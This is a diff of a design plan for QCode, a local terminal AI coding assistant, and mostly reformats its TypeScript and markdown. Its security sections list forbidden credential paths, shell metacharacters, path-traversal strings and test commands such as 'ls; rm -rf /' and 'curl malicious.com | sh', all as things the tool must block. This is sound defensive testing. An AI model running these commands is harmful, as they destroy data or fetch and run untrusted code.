@@ -15,20 +15,24 @@ QCode is a **terminal-based AI coding assistant** that provides a local alternat
 7. **Working with Any Editor** - Terminal-based, integrates with VS Code, Vim, etc.
 
 **The Core Loop:**
+
 ```
 User Query → Context Analysis → LLM Processing (JSON) → Tool Execution (Direct + MCP) → Response
 ```
 
 **Key Difference from Cursor:**
+
 - Cursor = AI-powered IDE/editor
 - QCode = Terminal AI assistant that works alongside your existing editor
 
 **Key Difference from Claude Coder:**
+
 - Claude Coder = Uses remote APIs (Claude, GPT)
 - QCode = Uses local LLMs (Ollama) for privacy and control
 
 **Why Build QCode?**
 Claude Coder is excellent, but API costs add up fast during serious development:
+
 - ✅ **Same great experience** - Terminal-based AI coding assistant
 - ✅ **Zero API costs** - Uses local Ollama models instead of Claude API
 - ✅ **Privacy first** - Your code never leaves your machine
@@ -40,13 +44,15 @@ Claude Coder is excellent, but API costs add up fast during serious development:
 ### The Smart Strategy: Use Both Tools Together
 
 **Claude Coder = Galaxy Brain 🌌**
+
 - Complex architectural decisions
-- High-level refactoring strategy  
+- High-level refactoring strategy
 - Advanced problem-solving
 - Code review and optimization
 - When you need the absolute best reasoning
 
 **QCode = Execution Brain ⚡**
+
 - Implementing the plan Claude Coder designed
 - Repetitive tasks (file operations, simple edits)
 - Quick code generation and fixes
@@ -54,11 +60,12 @@ Claude Coder is excellent, but API costs add up fast during serious development:
 - Testing and iteration cycles
 
 ### Example Workflow:
+
 ```bash
 # 1. Use Claude Coder for strategic thinking
 claude-coder "Design the architecture for a new user authentication system"
 
-# 2. Use QCode to execute the implementation 
+# 2. Use QCode to execute the implementation
 qcode "Create the user model file with the fields Claude suggested"
 qcode "Add the authentication middleware to the routes"
 qcode "Write unit tests for the auth functions"
@@ -66,6 +73,7 @@ qcode "Update the database migration files"
 ```
 
 ### Cost-Effective Development Strategy:
+
 - **$2-5 for strategic session** with Claude Coder (high-value decisions)
 - **$0 for implementation** with QCode (repetitive execution)
 - **Result**: 80% cost savings while keeping the best parts of both tools
@@ -73,6 +81,7 @@ qcode "Update the database migration files"
 ## 🎯 TypeScript Implementation Plan - Hybrid Architecture
 
 ### Core Principles
+
 1. **Direct Internal Tools**: Fast, native TypeScript for core functionality
 2. **MCP Client**: Connect to external MCP tools (stdin/stdout + HTTP streaming)
 3. **JSON Tool Calling**: Structured outputs for reliable automation
@@ -116,6 +125,7 @@ src/
 ```
 
 ### 📦 Dependencies
+
 ```json
 {
   "dependencies": {
@@ -137,6 +147,7 @@ src/
 ## 🚀 Implementation Phases
 
 ### Phase 1: Core Foundation + Security (Week 1)
+
 **Goal**: Build secure foundation with Ollama + namespaced internal tools
 
 We'll implement these core interfaces:
@@ -184,23 +195,23 @@ export class WorkspaceSecurity {
   validatePath(path: string): ValidationResult {
     try {
       const normalizedPath = normalizePath(resolve(path));
-      
+
       // Check if path is within workspace
       if (!isPathInside(normalizedPath, this.workspaceRoot)) {
         return {
           valid: false,
           error: 'Path outside workspace boundary',
-          code: 'WORKSPACE_VIOLATION'
+          code: 'WORKSPACE_VIOLATION',
         };
       }
 
-      // Check forbidden patterns  
+      // Check forbidden patterns
       for (const pattern of this.forbiddenPatterns) {
         if (pattern.test(normalizedPath)) {
           return {
             valid: false,
             error: `Path matches forbidden pattern: ${pattern}`,
-            code: 'FORBIDDEN_PATTERN'
+            code: 'FORBIDDEN_PATTERN',
           };
         }
       }
@@ -211,7 +222,7 @@ export class WorkspaceSecurity {
         return {
           valid: false,
           error: 'Path traversal attempt detected',
-          code: 'PATH_TRAVERSAL'
+          code: 'PATH_TRAVERSAL',
         };
       }
 
@@ -220,7 +231,7 @@ export class WorkspaceSecurity {
       return {
         valid: false,
         error: `Invalid path: ${error.message}`,
-        code: 'INVALID_PATH'
+        code: 'INVALID_PATH',
       };
     }
   }
@@ -241,29 +252,32 @@ export class ToolRegistry {
       name: tool.name,
       fullName: `internal.${tool.name}`,
       definition: tool.toOllamaFormat(),
-      execute: (args) => this.executeWithSecurity(tool, args)
+      execute: args => this.executeWithSecurity(tool, args),
     };
-    
+
     this.internalTools.set(namespacedTool.fullName, namespacedTool);
     this.allTools.set(namespacedTool.fullName, namespacedTool);
   }
 
-  // Register MCP server and discover its tools  
-  async registerMCPServer(serverName: string, client: MCPStdioClient | MCPHttpClient): Promise<void> {
+  // Register MCP server and discover its tools
+  async registerMCPServer(
+    serverName: string,
+    client: MCPStdioClient | MCPHttpClient
+  ): Promise<void> {
     try {
       // Discover tools from MCP server
       const tools = await client.listTools();
       const toolMap = new Map<string, ToolDefinition>();
-      
+
       for (const tool of tools) {
         const namespacedTool: NamespacedTool = {
           namespace: serverName,
           name: tool.name,
           fullName: `${serverName}.${tool.name}`,
           definition: tool,
-          execute: (args) => client.callTool(tool.name, args)
+          execute: args => client.callTool(tool.name, args),
         };
-        
+
         toolMap.set(tool.name, tool);
         this.allTools.set(namespacedTool.fullName, namespacedTool);
       }
@@ -273,12 +287,11 @@ export class ToolRegistry {
         type: client instanceof MCPStdioClient ? 'stdio' : 'http',
         connected: true,
         tools: toolMap,
-        client
+        client,
       };
-      
+
       this.mcpServers.set(serverName, serverInfo);
       console.log(`✅ Registered MCP server: ${serverName} with ${tools.length} tools`);
-      
     } catch (error) {
       console.error(`❌ Failed to register MCP server ${serverName}:`, error.message);
       throw error;
@@ -290,13 +303,12 @@ export class ToolRegistry {
     const tool = this.allTools.get(fullName);
     if (!tool) {
       // Try to find tool by partial name for backward compatibility
-      const matchingTools = Array.from(this.allTools.values())
-        .filter(t => t.name === fullName);
-      
+      const matchingTools = Array.from(this.allTools.values()).filter(t => t.name === fullName);
+
       if (matchingTools.length === 0) {
         throw new QCodeError(`Tool not found: ${fullName}`, 'TOOL_NOT_FOUND');
       }
-      
+
       if (matchingTools.length > 1) {
         const suggestions = matchingTools.map(t => t.fullName).join(', ');
         throw new QCodeError(
@@ -304,7 +316,7 @@ export class ToolRegistry {
           'AMBIGUOUS_TOOL_NAME'
         );
       }
-      
+
       return await matchingTools[0].execute(args);
     }
 
@@ -317,8 +329,8 @@ export class ToolRegistry {
       ...tool.definition,
       function: {
         ...tool.definition.function,
-        name: tool.fullName // Use namespaced name
-      }
+        name: tool.fullName, // Use namespaced name
+      },
     }));
   }
 
@@ -331,7 +343,7 @@ export class ToolRegistry {
       }
       args.path = validation.safePath;
     }
-    
+
     return await tool.execute(args);
   }
 }
@@ -351,7 +363,7 @@ export class FilesTool {
     path: z.string(),
     content: z.string().optional(),
     pattern: z.string().optional(),
-    lines: z.object({ start: z.number(), end: z.number() }).optional()
+    lines: z.object({ start: z.number(), end: z.number() }).optional(),
   });
 
   async execute(args: z.infer<typeof this.schema>): Promise<any> {
@@ -362,20 +374,20 @@ export class FilesTool {
           return await this.readLines(args.path, args.lines.start, args.lines.end);
         }
         return { content: await fs.readFile(args.path, 'utf8') };
-        
+
       case 'write':
         if (!args.content) throw new Error('Content required for write operation');
         await fs.writeFile(args.path, args.content);
         return { success: true, path: args.path };
-        
+
       case 'list':
-        const files = await glob(args.pattern || '*', { 
+        const files = await glob(args.pattern || '*', {
           cwd: args.path,
           onlyFiles: false,
-          markDirectories: true 
+          markDirectories: true,
         });
         return { files };
-        
+
       case 'search':
         if (!args.pattern) throw new Error('Pattern required for search');
         const results = await this.searchFiles(args.pattern, args.path);
@@ -387,34 +399,34 @@ export class FilesTool {
     const content = await fs.readFile(filePath, 'utf8');
     const lines = content.split('\n');
     const selectedLines = lines.slice(start - 1, end);
-    return { 
+    return {
       content: selectedLines.join('\n'),
       totalLines: lines.length,
-      selectedRange: { start, end }
+      selectedRange: { start, end },
     };
   }
 
   private async searchFiles(pattern: string, searchPath: string): Promise<any[]> {
-    const files = await glob('**/*', { 
+    const files = await glob('**/*', {
       cwd: searchPath,
       onlyFiles: true,
-      ignore: ['node_modules/**', '.git/**', '*.log']
+      ignore: ['node_modules/**', '.git/**', '*.log'],
     });
-    
+
     const results = [];
     const regex = new RegExp(pattern, 'gi');
-    
+
     for (const file of files) {
       try {
         const fullPath = `${searchPath}/${file}`;
         const content = await fs.readFile(fullPath, 'utf8');
         const matches = [...content.matchAll(regex)];
-        
+
         if (matches.length > 0) {
           results.push({
             file,
             matches: matches.length,
-            lines: this.getMatchingLines(content, regex)
+            lines: this.getMatchingLines(content, regex),
           });
         }
       } catch (error) {
@@ -422,23 +434,23 @@ export class FilesTool {
         continue;
       }
     }
-    
+
     return results;
   }
 
   private getMatchingLines(content: string, regex: RegExp): any[] {
     const lines = content.split('\n');
     const matchingLines = [];
-    
+
     lines.forEach((line, index) => {
       if (regex.test(line)) {
         matchingLines.push({
           lineNumber: index + 1,
-          content: line.trim()
+          content: line.trim(),
         });
       }
     });
-    
+
     return matchingLines;
   }
 
@@ -448,8 +460,8 @@ export class FilesTool {
       function: {
         name: this.name,
         description: this.description,
-        parameters: zodToJsonSchema(this.schema)
-      }
+        parameters: zodToJsonSchema(this.schema),
+      },
     };
   }
 }
@@ -477,6 +489,7 @@ interface InternalTool {
 ## 🎨 Professional CLI Experience
 
 ### Streaming UX with Tool Indicators
+
 ```typescript
 // Real-time feedback during execution
 🧠 Building context...
@@ -489,6 +502,7 @@ Here's what I found in your TypeScript project...
 ```
 
 ### Interactive Chat Mode
+
 ```typescript
 export class CLIInterface {
   async startChatMode(): Promise<void> {
@@ -498,18 +512,18 @@ export class CLIInterface {
     const rl = readline.createInterface({
       input: process.stdin,
       output: process.stdout,
-      prompt: chalk.blue('qcode> ')
+      prompt: chalk.blue('qcode> '),
     });
 
-    rl.on('line', async (input) => {
+    rl.on('line', async input => {
       const query = input.trim();
-      
+
       if (query === 'exit' || query === 'quit') {
         this.rl?.close();
         console.log(chalk.yellow('👋 Goodbye!'));
         process.exit(0);
       }
-      
+
       // Handle Claude Coder-compatible slash commands
       if (query.startsWith('/')) {
         await this.handleSlashCommand(query);
@@ -520,7 +534,7 @@ export class CLIInterface {
       if (query) {
         await this.processQuery(query);
       }
-      
+
       console.log();
       rl.prompt();
     });
@@ -528,10 +542,12 @@ export class CLIInterface {
 
   private async handleSlashCommand(command: string): Promise<void> {
     const [cmd, ...args] = command.slice(1).split(' ');
-    
+
     switch (cmd) {
       case 'init':
-        await this.processQuery('Create a QCODE.md file with project context and coding conventions');
+        await this.processQuery(
+          'Create a QCODE.md file with project context and coding conventions'
+        );
         break;
       case 'config':
         await this.showConfiguration();
@@ -556,14 +572,14 @@ export class CLIInterface {
     console.log('  help     - Show this help message');
     console.log('  clear    - Clear the screen');
     console.log('  exit     - Exit QCode');
-    
+
     console.log(chalk.cyan('\nSlash commands (Claude Coder compatible):'));
     console.log('  /init    - Initialize project memory (QCODE.md)');
     console.log('  /config  - Configure QCode settings');
     console.log('  /mcp     - Show MCP server status');
     console.log('  /commit  - Create a git commit');
     console.log('  /pr      - Create a pull request');
-    
+
     console.log(chalk.cyan('\nExample queries:'));
     console.log('  "What files are in this project?"');
     console.log('  "Create a TypeScript interface for User"');
@@ -584,9 +600,9 @@ export class CLIInterface {
 
   private getErrorTip(errorCode: string): string {
     const tips = {
-      'OLLAMA_CONNECTION_ERROR': 'Try running "ollama serve"',
-      'TOOL_NOT_FOUND': 'Check available tools with "help"',
-      'MCP_CONNECTION_FAILED': 'Check MCP server configuration'
+      OLLAMA_CONNECTION_ERROR: 'Try running "ollama serve"',
+      TOOL_NOT_FOUND: 'Check available tools with "help"',
+      MCP_CONNECTION_FAILED: 'Check MCP server configuration',
     };
     return tips[errorCode] || 'Check documentation';
   }
@@ -594,6 +610,7 @@ export class CLIInterface {
 ```
 
 ### Usage Modes
+
 ```bash
 # One-shot commands
 qcode "List TypeScript files and show me the main entry point"
@@ -618,38 +635,40 @@ qcode> exit
 ## 🔒 Security Model (Unix/Linux Focus)
 
 ### Workspace Boundary Enforcement
+
 ```typescript
 // All operations contained within workspace root
 export class WorkspaceSecurity {
   validatePath(path: string): ValidationResult {
     const normalizedPath = normalizePath(resolve(path));
-    
+
     // Ensure path is within workspace
     if (!isPathInside(normalizedPath, this.workspaceRoot)) {
       return { valid: false, code: 'WORKSPACE_VIOLATION' };
     }
-    
+
     // Prevent path traversal
     const relativePath = relative(this.workspaceRoot, normalizedPath);
     if (relativePath.startsWith('..')) {
       return { valid: false, code: 'PATH_TRAVERSAL' };
     }
-    
+
     return { valid: true, safePath: normalizedPath };
   }
 }
 ```
 
 ### Secure Defaults
+
 ```json
 {
   "security": {
     "forbiddenPatterns": [
-      ".*\\.env.*",        // Environment files
-      ".*/\\.ssh/.*",      // SSH keys
-      ".*/\\.aws/.*",      // AWS credentials  
-      ".*/secrets/.*",     // Secret directories
-      "/etc/passwd",       // System files
+      ".*\\.env.*", // Environment files
+      ".*/\\.ssh/.*", // SSH keys
+      ".*/\\.aws/.*", // AWS credentials
+      ".*/secrets/.*", // Secret directories
+      "/etc/passwd", // System files
       "/etc/shadow",
       "/tmp/.*",
       "/var/log/.*"
@@ -661,26 +680,27 @@ export class WorkspaceSecurity {
 ```
 
 ### Command Injection Prevention
+
 ```typescript
 // Whitelist approach with argument validation
 export class CommandSecurity {
   validateCommand(command: string, args: string[]): ValidationResult {
     const allowedCommands = ['git', 'ls', 'cat', 'grep', 'find'];
-    
+
     if (!allowedCommands.includes(command)) {
       return { valid: false, code: 'COMMAND_NOT_ALLOWED' };
     }
-    
+
     // Validate arguments don't contain dangerous patterns
     const dangerousPatterns = ['&&', '||', ';', '|', '>', '<', '`', '$'];
-    const hasUnsafeArgs = args.some(arg => 
+    const hasUnsafeArgs = args.some(arg =>
       dangerousPatterns.some(pattern => arg.includes(pattern))
     );
-    
+
     if (hasUnsafeArgs) {
       return { valid: false, code: 'UNSAFE_ARGUMENTS' };
     }
-    
+
     return { valid: true };
   }
 }
@@ -689,9 +709,10 @@ export class CommandSecurity {
 ## 🔧 Configuration System
 
 ### Hierarchical Configuration
+
 ```typescript
 // 1. Built-in defaults
-// 2. Global config: ~/.qcode/config.json  
+// 2. Global config: ~/.qcode/config.json
 // 3. Project config: .qcode/config.json
 // 4. Environment variables
 // 5. CLI arguments
@@ -701,37 +722,36 @@ export const DEFAULT_CONFIG = {
   ollamaUrl: 'http://localhost:11434',
   maxTokens: 8192,
   outputFormat: 'stream',
-  
+
   security: {
     workspaceOnly: true,
-    forbiddenPatterns: [
-      '.*\\.env.*', '.*/\\.ssh/.*', '.*/secrets/.*'
-    ]
+    forbiddenPatterns: ['.*\\.env.*', '.*/\\.ssh/.*', '.*/secrets/.*'],
   },
-  
+
   mcp: {
     enabled: false,
-    servers: []
-  }
+    servers: [],
+  },
 };
 ```
 
 ### Configuration Validation
+
 ```typescript
 const ConfigSchema = z.object({
   model: z.string().min(1),
   ollamaUrl: z.string().url(),
   maxTokens: z.number().positive(),
-  
+
   security: z.object({
     workspaceOnly: z.boolean(),
-    forbiddenPatterns: z.array(z.string())
+    forbiddenPatterns: z.array(z.string()),
   }),
-  
+
   mcp: z.object({
     enabled: z.boolean(),
-    servers: z.array(MCPServerSchema)
-  })
+    servers: z.array(MCPServerSchema),
+  }),
 });
 
 export function loadConfig(): Config {
@@ -740,16 +760,16 @@ export function loadConfig(): Config {
     loadGlobalConfig(),
     loadProjectConfig(),
     loadEnvConfig(),
-    loadCliConfig()
+    loadCliConfig(),
   ];
-  
+
   const merged = configs.reduce((acc, config) => ({ ...acc, ...config }), {});
-  
+
   const result = ConfigSchema.safeParse(merged);
   if (!result.success) {
     throw new QCodeError(`Invalid configuration: ${result.error.message}`, 'CONFIG_INVALID');
   }
-  
+
   return result.data;
 }
 ```
@@ -757,17 +777,19 @@ export function loadConfig(): Config {
 ## 🧪 Testing Strategy - Real API with VCR
 
 ### Core Testing Philosophy
+
 - ✅ **Real Ollama API** - Test against actual model responses for realistic behavior
 - ✅ **VCR-style Recording** - Record real interactions once, replay deterministically
 - ✅ **Security First** - Comprehensive security testing before features
 - ✅ **Progressive Coverage** - Unit → Integration → E2E
 
 ### VCR Implementation
+
 ```typescript
 export function withVCR(cassetteName: string, record = false) {
   return async <T>(testFn: () => Promise<T>): Promise<T> => {
     const cassettePath = `./tests/fixtures/ollama-cassettes/${cassetteName}.json`;
-    
+
     if (record || !existsSync(cassettePath)) {
       console.log(`🔴 Recording cassette: ${cassetteName}`);
       return await recordCassette(cassettePath, testFn);
@@ -788,6 +810,7 @@ test('file operations with real model', async () => {
 ```
 
 ### Test Architecture
+
 ```
 tests/
 ├── unit/
@@ -809,6 +832,7 @@ tests/
 ```
 
 ### Security Testing
+
 ```typescript
 describe('Security Validation', () => {
   test('prevents path traversal attacks', () => {
@@ -816,22 +840,18 @@ describe('Security Validation', () => {
       '../../../etc/passwd',
       '..\\..\\..\\etc\\passwd',
       '/etc/passwd',
-      '~/../../etc/passwd'
+      '~/../../etc/passwd',
     ];
-    
+
     for (const attack of attacks) {
       const result = security.validatePath(attack);
       expect(result.valid).toBe(false);
     }
   });
-  
+
   test('blocks command injection', () => {
-    const malicious = [
-      'ls; rm -rf /',
-      'cat /etc/passwd',
-      'curl malicious.com | sh'
-    ];
-    
+    const malicious = ['ls; rm -rf /', 'cat /etc/passwd', 'curl malicious.com | sh'];
+
     for (const cmd of malicious) {
       expect(() => shell.execute(cmd)).toThrow();
     }
@@ -842,6 +862,7 @@ describe('Security Validation', () => {
 ## 📊 Success Metrics
 
 ### Technical Requirements
+
 - ✅ **Zero critical security vulnerabilities**
 - ✅ **>95% tool execution success rate**
 - ✅ **<2s response time for simple queries**
@@ -849,6 +870,7 @@ describe('Security Validation', () => {
 - ✅ **Graceful handling of MCP server failures**
 
 ### User Experience Goals
+
 - ✅ **Claude Coder-compatible commands and workflow**
 - ✅ **Real-time streaming with clear progress indicators**
 - ✅ **Helpful error messages with recovery suggestions**
@@ -856,6 +878,7 @@ describe('Security Validation', () => {
 - ✅ **Professional terminal experience**
 
 ### Performance Targets
+
 - ✅ **Tool execution**: <500ms for file operations
 - ✅ **MCP calls**: <2s timeout with retry logic
 - ✅ **Context building**: <1s for typical projects
@@ -864,24 +887,28 @@ describe('Security Validation', () => {
 ## 📈 Implementation Timeline
 
 ### Week 1: Core Foundation
+
 - Ollama client with function calling
 - Internal tools (files, basic security)
 - Simple CLI with one-shot commands
 - **Deliverable**: `qcode "list files"` works
 
-### Week 2: MCP Integration  
+### Week 2: MCP Integration
+
 - MCP stdio/HTTP clients
 - Tool discovery and registration
 - Namespaced tool execution
 - **Deliverable**: External MCP tools work
 
 ### Week 3: Enhanced Tools + Context
+
 - EditTool with diff support
 - Basic project context
 - Git integration
 - **Deliverable**: Can edit files and understand project
 
 ### Week 4: Professional Experience
+
 - Interactive chat mode
 - Slash commands
 - Configuration system
